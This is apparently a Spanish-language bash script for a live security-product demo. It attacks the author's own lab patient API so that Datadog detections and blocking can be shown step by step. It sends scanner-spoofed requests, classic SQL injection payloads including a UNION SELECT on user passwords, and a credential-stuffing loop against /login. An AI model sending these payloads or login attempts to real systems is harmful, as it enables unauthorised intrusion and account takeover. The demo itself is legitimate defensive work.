#!/usr/bin/env bash
#
# demo.sh — ataque EN VIVO, paso por paso, para la demo de AAP con ProsperIA.
# Pausa entre cada paso para que te cambies a Datadog y lo muestres.
# Solo contra tu propio lab.
#
# Uso:
#   ./attack/demo.sh http://localhost:8080
#   ./attack/demo.sh http://<ip-ec2>:8080
#
set -uo pipefail

TARGET="${1:-http://localhost:8080}"
SCANNER_UA="sqlmap/1.7 (http://sqlmap.org)"

# Colores
B=$'\033[1m'; C=$'\033[36m'; G=$'\033[32m'; Y=$'\033[33m'; R=$'\033[31m'; N=$'\033[0m'

pausa() {
  echo
  echo "${Y}   >> ${1}${N}"
  echo "${Y}   ---------------------------------------------------------------${N}"
  printf "${Y}   [ENTER] para continuar · [q] para salir: ${N}"
  read -r _k
  [ "$_k" = "q" ] && { echo "Fin."; exit 0; }
  echo
}

decir() { echo "   ${C}Qué decir:${N} \"${1}\""; }

req() {  # metodo descripcion curl-args...
  local desc="$1"; shift
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" -A "$SCANNER_UA" "$@")
  local color="$G"; [ "$code" = "403" ] && color="$R"
  printf "      %-55s ${color}HTTP %s${N}\n" "$desc" "$code"
}

clear
cat <<EOF
${B}========================================================================${N}
${B}  DEMO AAP — ProsperIA · Ataque en vivo de punta a punta${N}
${B}  Objetivo: ${TARGET}${N}
${B}========================================================================${N}

  Deja esta terminal compartida. Cambia a Datadog cuando el script te lo pida.
  Ten abierto: Security -> App and API Protection -> Signals
               (filtro: service:prosperia-patient-api)
EOF
pausa "Listo para empezar"

# ----------------------------------------------------------------------------
echo "${B}[0/6] Estado normal — la app funciona como siempre${N}"
req "busqueda legitima: q=maria" -G --data-urlencode "q=maria" "$TARGET/search"
decir "Esta es su app de pacientes operando normal. Ahora llega alguien de afuera."
pausa "PASO 1: vamos a simular al atacante"

# ----------------------------------------------------------------------------
echo "${B}[1/6] Escaneo — User-Agent de scanner (sqlmap)${N}"
for i in $(seq 1 8); do
  req "scan #$i" -G --data-urlencode "q=maria" "$TARGET/search"
  sleep 0.2
done
decir "Esto lo está haciendo alguien afuera, ahorita. No es análisis estático."
pausa "En Datadog: AAP -> Signals -> aparece 'Security Scanner Detected'"

# ----------------------------------------------------------------------------
echo "${B}[2/6] SQL Injection — payloads reales en el parámetro q${N}"
PAYLOADS=(
  "' OR '1'='1"
  "' OR 1=1 --"
  "admin' --"
)
for p in "${PAYLOADS[@]}"; do
  req "q = $p" -G --data-urlencode "q=$p" "$TARGET/search"
  sleep 0.4
done
decir "Así se clasificó: severidad y regla OWASP. En la traza ves el payload exacto."
pausa "En Datadog: abre la señal SQLi -> pestaña Security de la traza (parámetro q)"

# ----------------------------------------------------------------------------
echo "${B}[3/6] Quién está afuera + Exploit Prevention (RASP)${N}"
req "UNION SELECT contra la tabla users" -G \
  --data-urlencode "q=' UNION SELECT username, password, 1 FROM users --" "$TARGET/search"
decir "RASP detecta el intento justo antes de que toque Postgres, con stack trace."
echo "   ${C}También:${N} Attacker/IP -> geo, reputación, # de requests."
pausa "En Datadog: traza -> Security -> evento 'Exploit Prevention' + stack trace"

# ----------------------------------------------------------------------------
echo "${B}[4/6] Account Takeover — credential stuffing contra /login${N}"
for u in jennifer miguel admin root; do
  for pw in 123456 password admin qwerty; do
    curl -s -o /dev/null -A "$SCANNER_UA" -H "Content-Type: application/json" \
      -d "{\"username\":\"$u\",\"password\":\"$pw\"}" "$TARGET/login"
  done
  printf "      %-55s ${Y}%s intentos${N}\n" "usuario: $u" "4"
done
decir "Gancho hacia session hijacking: aquí bloqueamos al usuario o las IPs."
pausa "En Datadog: señal de ATO (credential stuffing)"

# ----------------------------------------------------------------------------
echo "${B}[5/6] BLOQUEO — ahora cerramos la puerta${N}"
echo "   ${Y}Hazlo en la UI antes de continuar:${N}"
echo "     a) Block IP:  en la señal/traza -> Block IP (elige duración), o"
echo "     b) RASP Block: Security -> AAP -> Protection -> Exploit Prevention -> Block"
pausa "Cuando ya bloqueaste, [ENTER] para relanzar el ataque"

echo "${B}[6/6] Re-test — la cerradura responde${N}"
req "scan tras bloqueo" -G --data-urlencode "q=maria" "$TARGET/search"
req "SQLi tras bloqueo" -G --data-urlencode "q=' OR 1=1 --" "$TARGET/search"
decir "Así responde la cerradura: 403 y la traza queda marcada como blocked."
echo
echo "${B}Cierre:${N} Next steps / Bits AI / Case -> remediación + la vulnerabilidad"
echo "        IAST en la línea exacta del f-string (Code Security)."
echo
echo "${G}Fin de la demo.${N}"
